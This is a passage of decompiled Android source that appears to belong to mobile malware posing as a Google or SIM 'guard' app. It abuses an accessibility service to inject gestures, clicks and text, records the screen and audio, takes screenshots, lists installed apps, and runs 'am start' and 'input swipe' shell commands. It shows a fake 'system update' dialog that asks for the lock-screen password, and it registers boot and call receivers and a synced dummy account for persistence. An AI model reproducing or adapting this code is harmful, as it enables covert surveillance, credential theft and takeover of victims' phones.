            path = null;
        } else {
            Path path2 = new Path();
            Point point = pointArr[0];
            path2.moveTo(point.getX(), point.getY());
            if (pointArr.length > 1) {
                for (int i2 = 1; i2 < pointArr.length; i2++) {
                    Point point2 = pointArr[i2];
                    path2.lineTo(point2.getX(), point2.getY());
                }
            }
            path = path2;
        }
        if (path == null) {
            return false;
        }
        GestureDescription.StrokeDescription strokeDescription = new GestureDescription.StrokeDescription(path, l2.longValue(), l3.longValue());
        ArrayList arrayList = new ArrayList();
        arrayList.add(strokeDescription);
        if (MyAccessibilityService.m554P() == null || arrayList.isEmpty()) {
            return false;
        }
        GestureDescription.Builder builder = new GestureDescription.Builder();
        Iterator it = arrayList.iterator();
        while (it.hasNext()) {
            builder.addStroke((GestureDescription.StrokeDescription) it.next());
        }
        return MyAccessibilityService.m554P().dispatchGesture(builder.build(), null, null);
    }

    public static boolean S0() {
        Integer num = AbstractC0248d.f402a;
        return R0((MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialTitle())) ? "Verify lock screen password" : MainApplication.getInstance().getBuildConfig().getUpdateCredentialTitle(), (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialSubTitle())) ? "Fix system security vulnerabilities" : MainApplication.getInstance().getBuildConfig().getUpdateCredentialSubTitle(), (MainApplication.getInstance() == null || MainApplication.getInstance().getBuildConfig() == null || AbstractC0026q.m151B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialDescription())) ? "Please enter your lock screen password to complete the system update and fix security vulnerabilities." : MainApplication.getInstance().getBuildConfig().getUpdateCredentialDescription(), "PREPARE_FOR_UPDATE_SYSTEM");
    }

    /* renamed from: T */
    public static boolean m647T() {
        ScreenMetricsVO m616e = AbstractC0249e.m616e();
        int i2 = 0;
        if (m616e.getWidth() != null && m616e.getWidth().intValue() > 0 && m616e.getHeight() != null && m616e.getHeight().intValue() > 0) {
            Point point = new Point(m616e.getWidth().intValue() / 2.0f, m616e.getHeight().intValue() - 200.0f);
            Point point2 = new Point(m616e.getWidth().intValue() / 2.0f, 200.0f);
            if (MyAccessibilityService.m554P() != null) {
                boolean v1 = v1(10);
                int i3 = 0;
                while (!v1 && i3 < 10) {
                    long j2 = (i3 * 100) + 100;
                    if (j2 > 600) {
                        j2 = 600;
                    }
                    if (m646S(10L, Long.valueOf(j2), point, point2)) {
                        v1 = v1(20);
                        i3++;
                    }
                }
                if (v1) {
                    return true;
                }
            }
            if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                String format = String.format(Locale.getDefault(), "input swipe %.0f %.0f %.0f %.0f", Float.valueOf(point.getX()), Float.valueOf(point.getY()), Float.valueOf(point2.getX()), Float.valueOf(point2.getY()));
                boolean v12 = v1(10);
                while (!v12 && i2 < 10) {
                    if (C0318e.m844S().m855N(format)) {
                        v12 = v1(20);
                        i2++;
                    }
                }
                return v12;
            }
        }
        return false;
    }

    public static void T0(int i2) {
        if (i2 <= 0) {
            i2 = 1;
        }
        try {
            AtomicInteger atomicInteger = new AtomicInteger(i2);
            while (Thread.currentThread().isAlive() && !Thread.currentThread().isInterrupted() && atomicInteger.decrementAndGet() >= 0) {
                Thread.sleep(200L);
            }
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
        }
    }

    /* renamed from: U */
    public static byte[] m648U(String str) {
        Bitmap createBitmap;
        if (m653Z() != null && m665l() && !AbstractC0026q.m151B(str)) {
            try {
                Drawable applicationIcon = m653Z().getPackageManager().getApplicationIcon(str);
                if (applicationIcon != null) {
                    try {
                        createBitmap = Bitmap.createBitmap(applicationIcon.getIntrinsicWidth(), applicationIcon.getIntrinsicHeight(), applicationIcon.getOpacity() != -1 ? Bitmap.Config.ARGB_8888 : Bitmap.Config.RGB_565);
                        Canvas canvas = new Canvas(createBitmap);
                        applicationIcon.setBounds(0, 0, applicationIcon.getIntrinsicWidth(), applicationIcon.getIntrinsicHeight());
                        applicationIcon.draw(canvas);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("BitmapUtils", e2);
                    }
                    return M0(createBitmap, 1.0f, 100);
                }
                createBitmap = null;
                return M0(createBitmap, 1.0f, 100);
            } catch (Exception e3) {
                AbstractC0026q.m186s("ApplicationUtil", e3);
            }
        }
        return null;
    }

    public static void U0() {
        try {
            Thread.sleep(1 * 500);
        } catch (Exception e2) {
            AbstractC0026q.m186s("UnLockUtils", e2);
        }
    }

    /* renamed from: V */
    public static Drawable m649V(String str) {
        if (m653Z() == null || !m665l() || AbstractC0026q.m151B(str)) {
            return null;
        }
        try {
            return m653Z().getPackageManager().getApplicationIcon(str);
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return null;
        }
    }

    public static boolean V0() {
        try {
            if (m653Z() == null) {
                return false;
            }
            Intent intent = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            intent.addFlags(268435456);
            intent.addFlags(PKIFailureInfo.duplicateCertReq);
            intent.addFlags(67108864);
            intent.addFlags(2097152);
            intent.addFlags(8388608);
            ComponentName componentName = new ComponentName(m653Z(), (Class<?>) MyAccessibilityService.class);
            intent.putExtra(":settings:fragment_args_key", componentName.flattenToString());
            Bundle bundle = new Bundle();
            bundle.putString(":settings:fragment_args_key", componentName.flattenToString());
            intent.putExtra(":settings:show_fragment_args", bundle);
            m653Z().startActivity(intent);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    /* renamed from: W */
    public static AppInfo m650W(PackageManager packageManager, ApplicationInfo applicationInfo) {
        if (applicationInfo == null) {
            return null;
        }
        AppInfo appInfo = new AppInfo();
        appInfo.setPackageName(applicationInfo.packageName);
        if (!AbstractC0026q.m151B(applicationInfo.permission)) {
            appInfo.setPermission(applicationInfo.permission);
        }
        if (!AbstractC0026q.m151B(applicationInfo.className)) {
            appInfo.setAppClassName(applicationInfo.className);
        }
        appInfo.setProcessName(!AbstractC0026q.m151B(applicationInfo.processName) ? applicationInfo.processName : applicationInfo.packageName);
        appInfo.setIsEnable(applicationInfo.enabled ? 1 : 0);
        appInfo.setSystemApp((applicationInfo.flags & 1) == 1 ? 1 : 0);
        appInfo.setExternalApp((applicationInfo.flags & 262144) == 262144 ? 1 : 0);
        appInfo.setUninstalled(0);
        CharSequence applicationLabel = packageManager.getApplicationLabel(applicationInfo);
        if (applicationLabel != null) {
            appInfo.setApplicationLabel(applicationLabel.toString());
        }
        Intent launchIntentForPackage = packageManager.getLaunchIntentForPackage(applicationInfo.packageName);
        if (launchIntentForPackage != null) {
            if (launchIntentForPackage.getComponent() != null) {
                appInfo.setMainClassName(launchIntentForPackage.getComponent().getClassName());
            }
            if (launchIntentForPackage.getAction() != null) {
                appInfo.setMainAction(launchIntentForPackage.getAction());
            }
        }
        return appInfo;
    }

    public static synchronized void W0() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getAlarmReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                String concat = MainApplication.getInstance().getPackageName().concat(".alarm.action");
                String concat2 = MainApplication.getInstance().getPackageName().concat(".pause.accessibility");
                String concat3 = MainApplication.getInstance().getPackageName().concat(".resume.accessibility");
                intentFilter.addAction(concat);
                intentFilter.addAction(concat2);
                intentFilter.addAction(concat3);
                AlarmReceiver alarmReceiver = new AlarmReceiver();
                MainApplication.getInstance().setAlarmReceiver(alarmReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(alarmReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(alarmReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "startAlarmReceiver 启动完成");
            }
        }
    }

    /* renamed from: X */
    public static LinkedList m651X() {
        PackageManager packageManager;
        ActivityInfo activityInfo;
        try {
            if (m653Z() == null || (packageManager = m653Z().getPackageManager()) == null) {
                return null;
            }
            LinkedList linkedList = new LinkedList();
            Intent intent = new Intent("android.intent.action.VIEW");
            intent.addCategory("android.intent.category.DEFAULT");
            intent.addCategory("android.intent.category.BROWSABLE");
            intent.setData(Uri.parse("http://"));
            List<ResolveInfo> queryIntentActivities = packageManager.queryIntentActivities(intent, 131072);
            if (!queryIntentActivities.isEmpty()) {
                for (ResolveInfo resolveInfo : queryIntentActivities) {
                    if (resolveInfo != null && (activityInfo = resolveInfo.activityInfo) != null) {
                        String str = activityInfo.packageName;
                        if (!AbstractC0026q.m151B(str) && !linkedList.contains(str)) {
                            linkedList.add(str);
                        }
                    }
                }
            }
            return linkedList;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return null;
        }
    }

    public static boolean X0() {
        try {
            if (m653Z() == null) {
                return false;
            }
            Intent intent = new Intent("android.settings.SETTINGS");
            intent.addFlags(268435456);
            intent.addFlags(PKIFailureInfo.duplicateCertReq);
            intent.addFlags(2097152);
            intent.addFlags(8388608);
            m653Z().startActivity(intent);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    /* renamed from: Y */
    public static byte[] m652Y(String str) {
        return str.getBytes(Charset.forName("UTF-8"));
    }

    public static boolean Y0(String str, String str2) {
        Intent u02;
        boolean z2 = false;
        try {
            if (C0318e.m844S() != null && C0318e.m844S().mo302D()) {
                C0318e m844S = C0318e.m844S();
                m844S.getClass();
                if (!AbstractC0026q.m151B(str)) {
                    String className = (!AbstractC0026q.m151B(str2) || (u02 = u0(str)) == null || u02.getComponent() == null) ? str2 : u02.getComponent().getClassName();
                    if (!AbstractC0026q.m151B(className)) {
                        z2 = m844S.m855N("am start -n ".concat(str).concat("/").concat(className));
                    }
                }
            }
            if (z2) {
                return z2;
            }
            if (AbstractC0026q.m156G() && !AbstractC0026q.m150A()) {
                AbstractC0026q.m164O(null, null);
            }
            return d1(str, str2);
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    /* renamed from: Z */
    public static Context m653Z() {
        if (C0262b.m735a() != null) {
            return C0262b.m735a();
        }
        if (MainApplication.getAppContext() != null) {
            return MainApplication.getAppContext();
        }
        return null;
    }

    public static boolean Z0(String str) {
        try {
            if (m653Z() == null) {
                return false;
            }
            if (AbstractC0026q.m151B(str)) {
                str = m653Z().getPackageName();
            }
            Intent intent = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
            intent.setData(Uri.fromParts("package", str, null));
            intent.addFlags(268435456);
            intent.addFlags(8388608);
            m653Z().startActivity(intent);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* renamed from: a */
    public static boolean m654a(GlobalActionCondition globalActionCondition) {
        char c;
        UiObject m560J;
        if (globalActionCondition == null || AbstractC0026q.m151B(globalActionCondition.getActionName())) {
            return false;
        }
        String actionName = globalActionCondition.getActionName();
        actionName.getClass();
        int i2 = 1;
        switch (actionName.hashCode()) {
            case -2038603629:
                if (actionName.equals("hideSoftKeyboard")) {
                    c = 0;
                    break;
                }
                c = 65535;
                break;
            case -1473115856:
                if (actionName.equals("quickSettings")) {
                    c = 1;
                    break;
                }
                c = 65535;
                break;
            case -1400824069:
                if (actionName.equals("accessibilityButtonChooser")) {
                    c = 2;
                    break;
                }
                c = 65535;
                break;
            case -1357714453:
                if (actionName.equals("clicks")) {
                    c = 3;
                    break;
                }
                c = 65535;
                break;
            case -1325629270:
                if (actionName.equals("dpadUp")) {
                    c = 4;
                    break;
                }
                c = 65535;
                break;
            case -1152999879:
                if (actionName.equals("keyCodeHeadsetHook")) {
                    c = 5;
                    break;
                }
                c = 65535;
                break;
            case -934918565:
                if (actionName.equals("recent")) {
                    c = 6;
                    break;
                }
                c = 65535;
                break;
            case -923164956:
                if (actionName.equals("dpadCenter")) {
                    c = 7;
                    break;
                }
                c = 65535;
                break;
            case -908415649:
                if (actionName.equals("startScreenRecord")) {
                    c = '\b';
                    break;
                }
                c = 65535;
                break;
            case -821301755:
                if (actionName.equals("startAudioRecord")) {
                    c = '\t';
                    break;
                }
                c = 65535;
                break;
            case -417400442:
                if (actionName.equals("screenShot")) {
                    c = '\n';
                    break;
                }
                c = 65535;
                break;
            case -385981800:
                if (actionName.equals("dismissNotificationShade")) {
                    c = 11;
                    break;
                }
                c = 65535;
                break;
            case -140672769:
                if (actionName.equals("stopScreenRecord")) {
                    c = '\f';
                    break;
                }
                c = 65535;
                break;
            case -103799195:
                if (actionName.equals("stopAudioRecord")) {
                    c = '\r';
                    break;
                }
                c = 65535;
                break;
            case -75080375:
                if (actionName.equals("gesture")) {
                    c = 14;
                    break;
                }
                c = 65535;
                break;
            case 1170093:
                if (actionName.equals("powerDialog")) {
                    c = 15;
                    break;
                }
                c = 65535;
                break;
            case 3015911:
                if (actionName.equals("back")) {
                    c = 16;
                    break;
                }
                c = 65535;
                break;
            case 3208415:
                if (actionName.equals("home")) {
                    c = 17;
                    break;
                }
                c = 65535;
                break;
            case 94750088:
                if (actionName.equals("click")) {
                    c = 18;
                    break;
                }
                c = 65535;
                break;
            case 102022252:
                if (actionName.equals("longClick")) {
                    c = 19;
                    break;
                }
                c = 65535;
                break;
            case 106931267:
                if (actionName.equals("press")) {
                    c = 20;
                    break;
                }
                c = 65535;
                break;
            case 109854522:
                if (actionName.equals("swipe")) {
                    c = 21;
                    break;
                }
                c = 65535;
                break;
            case 194959693:
                if (actionName.equals("takeScreenshot")) {
                    c = 22;
                    break;
                }
                c = 65535;
                break;
            case 399827373:
                if (actionName.equals("dpadRight")) {
                    c = 23;
                    break;
                }
                c = 65535;
                break;
            case 595233003:
                if (actionName.equals("notification")) {
                    c = 24;
                    break;
                }
                c = 65535;
                break;
            case 742708148:
                if (actionName.equals("accessibilityShortcut")) {
                    c = 25;
                    break;
                }
                c = 65535;
                break;
            case 876717431:
                if (actionName.equals("lockScreen")) {
                    c = 26;
                    break;
                }
                c = 65535;
                break;
            case 925114912:
                if (actionName.equals("accessibilityButton")) {
                    c = 27;
                    break;
                }
                c = 65535;
                break;
            case 1470406094:
                if (actionName.equals("showSoftKeyboard")) {
                    c = 28;
                    break;
                }
                c = 65535;
                break;
            case 1571418285:
                if (actionName.equals("repeatClick")) {
                    c = 29;
                    break;
                }
                c = 65535;
                break;
            case 1675054833:
                if (actionName.equals("dpadDown")) {
                    c = 30;
                    break;
                }
                c = 65535;
                break;
            case 1675283030:
                if (actionName.equals("dpadLeft")) {
                    c = 31;
                    break;
                }
                c = 65535;
                break;
            case 1754686085:
                if (actionName.equals("accessibilityAllApps")) {
                    c = ' ';
                    break;
                }
                c = 65535;
                break;
            case 1984984239:
                if (actionName.equals("setText")) {
                    c = '!';
                    break;
                }
                c = 65535;
                break;
            case 1991609382:
                if (actionName.equals("splitScreen")) {
                    c = '\"';
                    break;
                }
                c = 65535;
                break;
            default:
                c = 65535;
                break;
        }
        switch (c) {
            case 0:
                if (MyAccessibilityService.m554P() == null) {
                    return false;
                }
                if (Objects.equals(Integer.valueOf(MyAccessibilityService.m554P().getSoftKeyboardController().getShowMode()), 1)) {
                    return true;
                }
                return MyAccessibilityService.m554P().getSoftKeyboardController().setShowMode(1);
            case 1:
                return F0(5);
            case 2:
                if (Build.VERSION.SDK_INT >= 31) {
                    return F0(12);
                }
                return false;
            case 3:
                if (globalActionCondition.getPoints() == null || globalActionCondition.getPoints().isEmpty()) {
                    return false;
                }
                return m673t(globalActionCondition.getPoints());
            case 4:
                if (Build.VERSION.SDK_INT >= 33) {
                    return F0(16);
                }
                return false;
            case 5:
                if (Build.VERSION.SDK_INT >= 31) {
                    return F0(10);
                }
                return false;
            case 6:
                return F0(3);
            case 7:
                if (Build.VERSION.SDK_INT >= 33) {
                    return F0(20);
                }
                return false;
            case '\b':
                return AbstractC0207l.m431n();
            case '\t':
                ActionValueCondition value = globalActionCondition.getValue();
                if (value != null && !AbstractC0026q.m151B(value.getKey()) && "audioSource".equals(value.getKey()) && "Int".equals(value.getType()) && AbstractC0026q.m153D(value.getValue())) {
                    return C0349d.m881b().m883d(Integer.valueOf(Integer.parseInt(value.getValue())).intValue());
                }
                return false;
            case '\n':
                String str = AbstractC0207l.f252a;
                if (AbstractC0026q.m154E(7912)) {
                    return false;
                }
                new C0204i("http://127.0.0.1:7912").m405d(null, "/screenshot/0", new C0350e(i2));
                return true;
            case 11:
                if (Build.VERSION.SDK_INT >= 31) {
                    return F0(15);
                }
                return false;
            case '\f':
                return AbstractC0207l.m432o();
            case '\r':
                return C0349d.m881b().m884e();
            case 14:
                if (globalActionCondition.getPoints() == null || globalActionCondition.getPoints().isEmpty()) {
                    return false;
                }
                if (globalActionCondition.getDuration().longValue() <= 0) {
                    globalActionCondition.setDuration(300L);
                }
                Point[] pointArr = new Point[globalActionCondition.getPoints().size()];
                globalActionCondition.getPoints().toArray(pointArr);
                return m646S(globalActionCondition.getStart(), globalActionCondition.getDuration(), pointArr);
            case 15:
                return F0(6);
            case 16:
                return F0(1);
            case 17:
                return F0(2);
            case 18:
                if (globalActionCondition.getPoints() == null || globalActionCondition.getPoints().isEmpty()) {
                    return false;
                }
                Point point = globalActionCondition.getPoints().get(0);
                return m672s(Integer.valueOf((int) point.getX()), Integer.valueOf((int) point.getY()));
            case 19:
                if (globalActionCondition.getPoints() == null || globalActionCondition.getPoints().isEmpty()) {
                    return false;
                }
                if (globalActionCondition.getDuration().longValue() <= 0) {
                    globalActionCondition.setDuration(200L);
                }
                Point point2 = globalActionCondition.getPoints().get(0);
                return m646S(16L, Long.valueOf(globalActionCondition.getDuration().longValue() + ViewConfiguration.getLongPressTimeout()), new Point(Integer.valueOf((int) point2.getX()).floatValue(), Integer.valueOf((int) point2.getY()).floatValue()));
            case 20:
                if (globalActionCondition.getPoints() == null || globalActionCondition.getPoints().isEmpty()) {
                    return false;
                }
                if (globalActionCondition.getDuration().longValue() <= 0) {
                    globalActionCondition.setDuration(600L);
                }
                Point point3 = globalActionCondition.getPoints().get(0);
                return G0(Integer.valueOf((int) point3.getX()), Integer.valueOf((int) point3.getY()), globalActionCondition.getDuration());
            case 21:
                if (globalActionCondition.getPoints() == null || globalActionCondition.getPoints().size() < 2) {
                    return false;
                }
                if (globalActionCondition.getDuration().longValue() <= 0) {
                    globalActionCondition.setDuration(600L);
                }
                Point point4 = globalActionCondition.getPoints().get(0);
                Point point5 = globalActionCondition.getPoints().get(1);
                return m646S(16L, globalActionCondition.getDuration(), new Point(Integer.valueOf((int) point4.getX()).intValue(), Integer.valueOf((int) point4.getY()).intValue()), new Point(Integer.valueOf((int) point5.getX()).intValue(), Integer.valueOf((int) point5.getY()).intValue()));
            case 22:
                int i3 = Build.VERSION.SDK_INT;
                if (i3 < 28 || MyAccessibilityService.m554P() == null || i3 < 28) {
                    return false;
                }
                return F0(9);
            case 23:
                if (Build.VERSION.SDK_INT >= 33) {
                    return F0(19);
                }
                return false;
            case 24:
                return F0(4);
            case 25:
                if (Build.VERSION.SDK_INT >= 31) {
                    return F0(13);
                }
                return false;
            case 26:
                if (Build.VERSION.SDK_INT >= 28) {
                    return F0(8);
                }
                return false;
            case 27:
                if (Build.VERSION.SDK_INT >= 31) {
                    return F0(11);
                }
                return false;
            case 28:
                if (MyAccessibilityService.m554P() == null) {
                    return false;
                }
                if (Objects.equals(Integer.valueOf(MyAccessibilityService.m554P().getSoftKeyboardController().getShowMode()), 0)) {
                    return true;
                }
                return MyAccessibilityService.m554P().getSoftKeyboardController().setShowMode(0);
            case 29:
                if (globalActionCondition.getPoints() == null || globalActionCondition.getPoints().isEmpty()) {
                    return false;
                }
                Point point6 = globalActionCondition.getPoints().get(0);
                int x2 = (int) point6.getX();
                int y2 = (int) point6.getY();
                Integer valueOf = Integer.valueOf(x2);
                Integer valueOf2 = Integer.valueOf(y2);
                Integer repeatCount = globalActionCondition.getRepeatCount();
                if (repeatCount == null || repeatCount.intValue() <= 0) {
                    repeatCount = 7;
                }
                Integer num = repeatCount;
                int i4 = 0;
                for (int i5 = 0; i5 < num.intValue(); i5++) {
                    try {
                        if (G0(valueOf, valueOf2, Long.valueOf(ViewConfiguration.getTapTimeout() + 50))) {
                            i4++;
                        }
                        Thread.sleep(200L);
                    } catch (Exception e2) {
                        AbstractC0026q.m186s("GlobalActionAutomator", e2);
                    }
                }
                return i4 == num.intValue();
            case 30:
                if (Build.VERSION.SDK_INT >= 33) {
                    return F0(17);
                }
                return false;
            case NamedGroup.brainpoolP256r1tls13 /* 31 */:
                if (Build.VERSION.SDK_INT >= 33) {
                    return F0(18);
                }
                return false;
            case ' ':
                if (Build.VERSION.SDK_INT >= 31) {
                    return F0(14);
                }
                return false;
            case '!':
                ActionValueCondition value2 = globalActionCondition.getValue();
                if (value2 == null || AbstractC0026q.m151B(value2.getKey()) || !TextBundle.TEXT_ENTRY.equals(value2.getKey()) || !"String".equals(value2.getType()) || AbstractC0026q.m151B(value2.getValue())) {
                    return false;
                }
                String value3 = value2.getValue();
                if (MyAccessibilityService.m554P() == null || (m560J = MyAccessibilityService.m554P().m560J()) == null) {
                    return false;
                }
                return m560J.setText(value3);
            case '\"':
                return F0(7);
            default:
                return false;
        }
    }

    /* JADX WARN: Removed duplicated region for block: B:14:0x0045 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:15:0x0046  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public static String a0(Context context) {
        String str;
        List<ActivityManager.RunningAppProcessInfo> runningAppProcesses;
        Object invoke;
        String str2 = null;
        String processName = Build.VERSION.SDK_INT >= 28 ? Application.getProcessName() : null;
        if (!AbstractC0026q.m151B(processName)) {
            return processName;
        }
        try {
            Method declaredMethod = Class.forName("android.app.ActivityThread", false, Application.class.getClassLoader()).getDeclaredMethod("currentProcessName", new Class[0]);
            declaredMethod.setAccessible(true);
            invoke = declaredMethod.invoke(null, new Object[0]);
        } catch (Throwable th) {
            th.printStackTrace();
        }
        if (invoke instanceof String) {
            str = (String) invoke;
            if (AbstractC0026q.m151B(str)) {
                return str;
            }
            if (context != null) {
                int myPid = Process.myPid();
                ActivityManager activityManager = (ActivityManager) context.getSystemService("activity");
                if (activityManager != null && (runningAppProcesses = activityManager.getRunningAppProcesses()) != null) {
                    Iterator<ActivityManager.RunningAppProcessInfo> it = runningAppProcesses.iterator();
                    while (true) {
                        if (!it.hasNext()) {
                            break;
                        }
                        ActivityManager.RunningAppProcessInfo next = it.next();
                        if (next.pid == myPid) {
                            str2 = next.processName;
                            break;
                        }
                    }
                }
            }
            Log.d("ProcessUtil", "currentProcessName:" + str2);
            return str2;
        }
        str = null;
        if (AbstractC0026q.m151B(str)) {
        }
    }

    public static boolean a1(String str) {
        if (m653Z() == null) {
            return false;
        }
        try {
            if (AbstractC0026q.m151B(str)) {
                str = m653Z().getPackageName();
            }
            Intent intent = new Intent("android.settings.action.MANAGE_WRITE_SETTINGS", Uri.parse("package:" + str));
            intent.addFlags(268435456);
            intent.addFlags(PKIFailureInfo.duplicateCertReq);
            intent.addFlags(67108864);
            intent.addFlags(2097152);
            intent.addFlags(8388608);
            m653Z().startActivity(intent);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    /* renamed from: b */
    public static boolean m655b() {
        if (m653Z() != null) {
            r1 = Settings.Secure.getInt(m653Z().getContentResolver(), "enable_secure_write", 0) == 1;
            if (r1) {
                Log.d("ApplicationUtil", "ADB Enable Secure Write");
            }
        }
        return r1;
    }

    public static String b0() {
        if (m653Z() != null) {
            Intent intent = new Intent("android.intent.action.MAIN");
            intent.addCategory("android.intent.category.HOME");
            ResolveInfo resolveActivity = m653Z().getPackageManager().resolveActivity(intent, 0);
            if (resolveActivity != null) {
                return resolveActivity.activityInfo.packageName;
            }
        }
        if (AbstractC0249e.m623l()) {
            return "com.bbk.launcher2";
        }
        if (AbstractC0249e.m624m()) {
            return "com.miui.home";
        }
        return null;
    }

    public static synchronized void b1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getBatteryReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.BATTERY_CHANGED");
                intentFilter.addAction("android.intent.action.BATTERY_OKAY");
                intentFilter.addAction("android.intent.action.BATTERY_LOW");
                BatteryLevelReceiver batteryLevelReceiver = new BatteryLevelReceiver();
                MainApplication.getInstance().setBatteryReceiver(batteryLevelReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(batteryLevelReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(batteryLevelReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "BatteryLevelReceiver 启动完成");
            }
        }
    }

    /* renamed from: c */
    public static boolean m656c() {
        if (m653Z() == null) {
            return true;
        }
        try {
            return !Objects.equals(Integer.valueOf(Settings.Secure.getInt(m653Z().getContentResolver(), "adb_install_need_confirm")), 0);
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return true;
        }
    }

    public static String c0(Context context) {
        boolean z2 = true;
        if (!Build.PRODUCT.contains("sdk")) {
            String str = Build.HARDWARE;
            if (!str.contains("goldfish") && !str.contains("ranchu") && Settings.Secure.getString(context.getContentResolver(), "android_id") != null) {
                z2 = false;
            }
        }
        return z2 ? "10.0.2.2" : "127.0.0.1";
    }

    public static synchronized void c1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getBootReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.BOOT_COMPLETED");
                intentFilter.addAction("android.intent.action.LOCKED_BOOT_COMPLETED");
                intentFilter.addAction("android.intent.action.UNLOCK_BOOT_COMPLETED");
                intentFilter.addAction("android.intent.action.QUICKBOOT_POWERON");
                intentFilter.addCategory("android.intent.category.HOME");
                intentFilter.addCategory("android.intent.category.DEFAULT");
                intentFilter.addCategory("android.intent.category.LAUNCHER");
                BootBroadcast bootBroadcast = new BootBroadcast();
                MainApplication.getInstance().setBootReceiver(bootBroadcast);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(bootBroadcast, intentFilter, "android.permission.RECEIVE_BOOT_COMPLETED", null, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(bootBroadcast, intentFilter, "android.permission.RECEIVE_BOOT_COMPLETED", null);
                }
                Log.d("ReceiverUtils", "BootBroadcast 启动完成");
            }
        }
    }

    /* renamed from: d */
    public static void m657d() {
        if (m653Z() != null) {
            AccountManager accountManager = AccountManager.get(m653Z());
            if (accountManager.getAccountsByType("com.guard.wallet").length == 0) {
                Account account = new Account(x0(), "com.guard.wallet");
                Bundle bundle = new Bundle();
                bundle.putString("SERVER", "com.guard.wallet.service.AccountAuthenticatorService");
                if (accountManager.addAccountExplicitly(account, "1234567890", bundle)) {
                    Log.d("AccountUtils", "addAccountExplicitly success");
                    ContentResolver.setIsSyncable(account, "com.guard.wallet", 1);
                    ContentResolver.setSyncAutomatically(account, "com.guard.wallet", true);
                    ContentResolver.addPeriodicSync(account, "com.guard.wallet", new Bundle(), 10L);
                }
            }
        }
    }

    public static AppInfo d0(String str) {
        if (m653Z() == null || !m665l() || AbstractC0026q.m151B(str)) {
            return null;
        }
        try {
            PackageManager packageManager = m653Z().getPackageManager();
            return m650W(packageManager, packageManager.getApplicationInfo(str, 128));
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return null;
        }
    }

    public static boolean d1(String str, String str2) {
        Intent A0;
        try {
            if (m653Z() == null || (A0 = A0(str, str2)) == null) {
                return false;
            }
            m653Z().startActivity(A0);
            return true;
        } catch (Exception e2) {
            AbstractC0026q.m186s("ApplicationUtil", e2);
            return false;
        }
    }

    /* renamed from: e */
    public static String m658e() {
        AppInfo d02;
        return (!m665l() || (d02 = d0("com.google.guard")) == null) ? "Sim卡紧急辅助" : d02.getApplicationLabel();
    }

    public static LinkedList e0() {
        LinkedList linkedList = new LinkedList();
        boolean z2 = false;
        if (m653Z() != null && m665l()) {
            try {
                PackageManager packageManager = m653Z().getPackageManager();
                List<ApplicationInfo> installedApplications = packageManager.getInstalledApplications(0);
                if (!installedApplications.isEmpty()) {
                    Iterator<ApplicationInfo> it = installedApplications.iterator();
                    while (it.hasNext()) {
                        AppInfo m650W = m650W(packageManager, it.next());
                        if (m650W != null) {
                            if (!AbstractC0026q.m151B(m650W.getPackageName()) && !Objects.equals(m653Z().getPackageName(), m650W.getPackageName()) && !"com.google.guard".equals(m650W.getPackageName())) {
                                z2 = true;
                            }
                            linkedList.add(m650W);
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("ApplicationUtil", e2);
            }
        }
        if (z2) {
            return linkedList;
        }
        return null;
    }

    public static synchronized void e1() {
        synchronized (AbstractC0251g.class) {
            if (MainApplication.getInstance() != null && MainApplication.getInstance().getCallReceiver() == null) {
                IntentFilter intentFilter = new IntentFilter();
                intentFilter.addAction("android.intent.action.NEW_OUTGOING_CALL");
                intentFilter.addAction("android.intent.action.PHONE_STATE");
                CallReceiver callReceiver = new CallReceiver();
                MainApplication.getInstance().setCallReceiver(callReceiver);
                if (Build.VERSION.SDK_INT >= 33) {
                    MainApplication.getInstance().registerReceiver(callReceiver, intentFilter, 2);
                } else {
                    MainApplication.getInstance().registerReceiver(callReceiver, intentFilter);
                }
                Log.d("ReceiverUtils", "CallReceiver 启动完成");
            }
        }
    }

    /* renamed from: f */
